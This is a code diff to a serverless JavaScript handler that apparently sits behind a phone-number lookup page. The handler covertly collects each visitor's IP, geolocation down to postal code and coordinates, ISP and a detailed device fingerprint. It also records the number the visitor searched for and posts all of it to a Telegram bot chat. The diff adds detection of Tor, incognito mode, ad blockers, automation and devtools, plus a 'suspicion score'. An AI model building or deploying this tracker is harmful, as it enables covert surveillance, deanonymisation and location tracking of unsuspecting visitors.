@@ -18,7 +18,7 @@ export default async function handler(request) {
     const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-    // ===== IP Address nikaalo =====
+    // ===== IP =====
     const ip = request.headers.get('x-forwarded-for')?.split(',')[0].trim()
             || request.headers.get('x-real-ip')
             || request.headers.get('cf-connecting-ip')
@@ -28,24 +28,12 @@ export default async function handler(request) {
     const referer = request.headers.get('referer') || 'Direct';
     const acceptLang = request.headers.get('accept-language') || 'Unknown';
 
-    // ===== IP LOOKUP (ipwho.is se) =====
+    // ===== IP LOOKUP =====
     let ipInfo = {
-      isp: 'Unknown',
-      org: 'Unknown',
-      as: 'Unknown',
-      asname: 'Unknown',
-      reverse: 'Unknown',
-      proxy: false,
-      hosting: false,
-      mobile: false,
-      country: 'Unknown',
-      city: 'Unknown',
-      region: 'Unknown',
-      regionName: 'Unknown',
-      zip: 'Unknown',
-      lat: null,
-      lon: null,
-      timezone: 'Unknown',
+      isp: 'Unknown', org: 'Unknown', as: 'Unknown', asname: 'Unknown',
+      reverse: 'Unknown', proxy: false, hosting: false, mobile: false,
+      country: 'Unknown', city: 'Unknown', region: 'Unknown', regionName: 'Unknown',
+      zip: 'Unknown', lat: null, lon: null, timezone: 'Unknown',
     };
 
     try {
@@ -78,7 +66,18 @@ export default async function handler(request) {
       console.error('IP lookup failed:', e);
     }
 
-    // ===== CLIENT-SIDE DATA (frontend se) =====
+    // ===== TOR DETECTION (Server Side) =====
+    let torDetected = 'No';
+    try {
+      if (ipInfo.asname && ipInfo.asname.toLowerCase().includes('tor')) {
+        torDetected = 'Yes (ASN match)';
+      }
+      if (ipInfo.isp && ipInfo.isp.toLowerCase().includes('tor')) {
+        torDetected = 'Yes (ISP match)';
+      }
+    } catch {}
+
+    // ===== CLIENT-SIDE DATA =====
     const body = await request.json().catch(() => ({}));
     const searchType = body.searchType || 'Unknown';
     const searchedNumber = body.searchedNumber || 'Not provided';
@@ -86,12 +85,15 @@ export default async function handler(request) {
     const screenAvail = body.screenAvail || 'Unknown';
     const colorDepth = body.colorDepth || 'Unknown';
     const pixelRatio = body.pixelRatio || 'Unknown';
+    const orientation = body.orientation || 'Unknown';
     const language = body.language || 'Unknown';
     const languages = body.languages || 'Unknown';
     const platform = body.platform || 'Unknown';
     const browserTZ = body.timezone || 'Unknown';
     const battery = body.battery || 'Unknown';
+    const batteryCharging = body.batteryCharging || 'Unknown';
     const gpu = body.gpu || 'Unknown';
+    const gpuVendor = body.gpuVendor || 'Unknown';
     const cores = body.cores || 'Unknown';
     const memory = body.memory || 'Unknown';
     const touch = body.touch || 'Unknown';
@@ -101,6 +103,17 @@ export default async function handler(request) {
     const connection = body.connection || 'Unknown';
     const pageLoadTime = body.pageLoadTime || 'Unknown';
     const vendor = body.vendor || 'Unknown';
+
+    // Detections
+    const incognito = body.incognito || 'Unknown';
+    const adBlocker = body.adBlocker || 'Unknown';
+    const vpnWebrtc = body.vpnWebrtc || 'Unknown';
+    const isBot = body.isBot || 'Unknown';
+    const botDetails = body.botDetails || 'Unknown';
+    const botScore = body.botScore || 0;
+    const headless = body.headless || 'Unknown';
+    const automation = body.automation || 'Unknown';
+    const devtools = body.devtools || 'Unknown';
 
     // ===== DEVICE DETECT =====
     const device = detectDevice(userAgent);
@@ -112,92 +125,102 @@ export default async function handler(request) {
       timeZone: 'Asia/Kolkata',
     });
 
-    // ===== MAPS LINK =====
-    const mapsLink =
-      ipInfo.lat && ipInfo.lon
-        ? `https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}`
-        : 'Not available';
+    // ===== SUSPICION SCORE =====
+    let suspicion = 0;
+    const suspicionFlags = [];
+    if (incognito === 'Yes') { suspicion += 20; suspicionFlags.push('Incognito'); }
+    if (adBlocker === 'Yes') { suspicion += 10; suspicionFlags.push('Ad Blocker'); }
+    if (torDetected !== 'No') { suspicion += 40; suspicionFlags.push('Tor'); }
+    if (isBot.includes('Bot')) { suspicion += 50; suspicionFlags.push('Bot'); }
+    if (headless !== 'No') { suspicion += 40; suspicionFlags.push('Headless'); }
+    if (automation !== 'No') { suspicion += 40; suspicionFlags.push('Automation'); }
+    if (devtools !== 'No') { suspicion += 20; suspicionFlags.push('DevTools'); }
+    if (ipInfo.proxy) { suspicion += 30; suspicionFlags.push('Proxy'); }
+    if (ipInfo.hosting) { suspicion += 20; suspicionFlags.push('Hosting'); }
 
-    // ===== VPN WARNING =====
-    let vpnWarning = '';
-    if (ipInfo.proxy || ipInfo.hosting) {
-      vpnWarning = '\n⚠️ *WARNING: VPN/Proxy Detected!*';
-    }
+    let suspicionLevel = 'LOW ✅';
+    if (suspicion >= 70) suspicionLevel = 'CRITICAL 🚨';
+    else if (suspicion >= 40) suspicionLevel = 'HIGH ⚠️';
+    else if (suspicion >= 20) suspicionLevel = 'MEDIUM ⚡';
 
-    // ===== TELEGRAM MESSAGE =====
+    // ===== MESSAGE =====
     const message = `
-🚨 *NEW SEARCH ALERT* 🚨${vpnWarning}
+<b>NEW SEARCH DETECTED</b>
+━━━━━━━━━━━━━━━━━━━━━
 
-🔍 *Type:* ${searchType}
-🔍 *Searched:* \`${searchedNumber}\`
+<b>Search Query</b>
+• Type: ${searchType}
+• Number: <code>${searchedNumber}</code>
 
-━━━━━━━━━━━━━━━━━━━━
-🌐 *IP ADDRESS INFO*
-━━━━━━━━━━━━━━━━━━━━
-📡 *IP:* \`${ip}\`
-🏢 *ISP:* ${ipInfo.isp}
-🏭 *Organization:* ${ipInfo.org}
-🔢 *ASN:* ${ipInfo.as}
-📛 *AS Name:* ${ipInfo.asname}
-🔄 *Reverse DNS:* ${ipInfo.reverse}
+<b>Threat Assessment</b>
+• Level: ${suspicionLevel}
+• Score: ${suspicion}/100
+• Flags: ${suspicionFlags.length > 0 ? suspicionFlags.join(', ') : 'None'}
 
-━━━━━━━━━━━━━━━━━━━━
-📍 *Location*
-━━━━━━━━━━━━━━━━━━━━
-🌍 *Country:* ${ipInfo.country}
-🏙️ *City:* ${ipInfo.city}
-📍 *Region:* ${ipInfo.regionName} (${ipInfo.region})
-📮 *Postal:* ${ipInfo.zip}
-🗺️ *Coords:* ${ipInfo.lat || '?'}, ${ipInfo.lon || '?'}
-🕐 *Timezone:* ${ipInfo.timezone}
-🔗 [Open in Maps](${mapsLink})
+━━━━━━━━━━━━━━━━━━━━━
+<b>SECURITY CHECKS</b>
+━━━━━━━━━━━━━━━━━━━━━
+• Incognito: ${incognito === 'Yes' ? '⚠️ YES' : '✅ No'}
+• Ad Blocker: ${adBlocker === 'Yes' ? '⚠️ YES' : '✅ No'}
+• Tor Network: ${torDetected === 'No' ? '✅ No' : '⚠️ ' + torDetected}
+• Bot Detection: ${isBot}
+• Bot Score: ${botScore}/12
+• Headless: ${headless === 'No' ? '✅ No' : '⚠️ ' + headless}
+• Automation: ${automation === 'No' ? '✅ No' : '⚠️ ' + automation}
+• DevTools: ${devtools === 'No' ? '✅ No' : '⚠️ ' + devtools}
+• WebRTC IP: <code>${vpnWebrtc}</code>
 
-━━━━━━━━━━━━━━━━━━━━
-🛡️ *Security Flags*
-━━━━━━━━━━━━━━━━━━━━
-🚫 *Proxy/VPN:* ${ipInfo.proxy ? '⚠️ YES' : '✅ No'}
-☁️ *Hosting/Datacenter:* ${ipInfo.hosting ? '⚠️ YES' : '✅ No'}
-📱 *Mobile Network:* ${ipInfo.mobile ? 'Yes' : 'No'}
+━━━━━━━━━━━━━━━━━━━━━
+<b>IP INFORMATION</b>
+━━━━━━━━━━━━━━━━━━━━━
+• IP: <code>${ip}</code>
+• ISP: ${ipInfo.isp}
+• ASN: ${ipInfo.as}
+• Country: ${ipInfo.country}
+• City: ${ipInfo.city}
+• Region: ${ipInfo.regionName} (${ipInfo.region})
+• Postal: ${ipInfo.zip}
+• Coordinates: ${ipInfo.lat || '?'}, ${ipInfo.lon || '?'}
+• Timezone: ${ipInfo.timezone}
 
-━━━━━━━━━━━━━━━━━━━━
-💻 *Device Info*
-━━━━━━━━━━━━━━━━━━━━
-📱 *Device:* ${device}
-🖥️ *OS:* ${os}
-🌐 *Browser:* ${browser}
-🏭 *Vendor:* ${vendor}
-🖥️ *Screen:* ${screen}
-📐 *Available:* ${screenAvail}
-🎨 *Color Depth:* ${colorDepth}
-🔍 *Pixel Ratio:* ${pixelRatio}
-🕐 *Browser TZ:* ${browserTZ}
-🗣️ *Language:* ${language}
-🌍 *All Languages:* ${languages}
-🧩 *Platform:* ${platform}
-🔋 *Battery:* ${battery}
-🎮 *GPU:* ${gpu}
-⚙️ *CPU Cores:* ${cores}
-💾 *RAM:* ${memory} GB
-👆 *Touch:* ${touch}
-🍪 *Cookies:* ${cookies}
-🚫 *Do Not Track:* ${doNotTrack}
-📶 *Online:* ${online}
-🌐 *Connection:* ${connection}
-⏱️ *Page Load:* ${pageLoadTime} ms
+• Proxy/VPN: ${ipInfo.proxy ? '⚠️ YES' : '✅ No'}
+• Hosting: ${ipInfo.hosting ? '⚠️ YES' : '✅ No'}
+• Mobile Net: ${ipInfo.mobile ? 'Yes' : 'No'}
 
-━━━━━━━━━━━━━━━━━━━━
-🔗 *Other*
-━━━━━━━━━━━━━━━━━━━━
-↩️ *Referrer:* ${referer}
-🗣️ *Accept-Language:* ${acceptLang}
-🕐 *Time:* ${timestamp}
+━━━━━━━━━━━━━━━━━━━━━
+<b>DEVICE INFORMATION</b>
+━━━━━━━━━━━━━━━━━━━━━
+• Device: ${device}
+• OS: ${os}
+• Browser: ${browser}
+• Screen: ${screen}
+• Orientation: ${orientation}
+• Pixel Ratio: ${pixelRatio}
+• Color Depth: ${colorDepth}
+• Language: ${language}
+• Timezone: ${browserTZ}
+• Platform: ${platform}
 
-━━━━━━━━━━━━━━━━━━━━
-📄 *Full User Agent:*
-\`${userAgent}\`
+• Battery: ${battery}${batteryCharging === 'Yes' ? ' (Charging)' : ''}
+• GPU: ${gpu}
+• CPU Cores: ${cores}
+• RAM: ${memory} GB
+• Touch: ${touch}
+• Cookies: ${cookies}
+• Do Not Track: ${doNotTrack}
+• Online: ${online}
+• Connection: ${connection}
+• Page Load: ${pageLoadTime} ms
+
+━━━━━━━━━━━━━━━━━━━━━
+<b>REQUEST METADATA</b>
+━━━━━━━━━━━━━━━━━━━━━
+• Referrer: ${referer}
+• Accept-Lang: ${acceptLang}
+• Time: ${timestamp}
+• User Agent: <code>${userAgent}</code>
 `;
 
-    // ===== TELEGRAM PE BHEJO =====
     const tgResponse = await fetch(
       `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
       {
@@ -206,7 +229,7 @@ export default async function handler(request) {
         body: JSON.stringify({
           chat_id: CHAT_ID,
           text: message,
-          parse_mode: 'Markdown',
+          parse_mode: 'HTML',
           disable_web_page_preview: true,
         }),
       }
